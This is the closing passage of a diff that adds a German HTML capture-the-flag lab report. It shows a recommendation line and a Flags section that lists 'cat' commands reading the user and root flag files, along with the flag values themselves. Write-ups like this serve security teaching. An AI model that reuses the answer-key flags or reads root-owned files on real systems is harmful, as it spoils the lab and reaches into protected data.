+              <br><strong>Empfehlung (Admin):</strong> Die Berechtigungen für die `root.txt`-Datei sind korrekt gesetzt.</p>
+
+            <!-- Die folgenden Befehle (Navigation und cat der Flags) gehören logisch zum Finden der Flags, werden aber im separaten Flags-Abschnitt gemäß Template dargestellt. -->
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/shopadmin/user.txt</div>
+                    <div class="flag-value"><span class="password">I_L0V3_V1NYL5</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">4UD10PH1L3</span></div>
+                </div>
+            </div>
+            <!-- Keine Analyse/Bewertung/Empfehlung im Flags-Abschnitt gemäß Anweisung -->
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2024-04-29</p>
+    </footer>
+</body>
+</html>
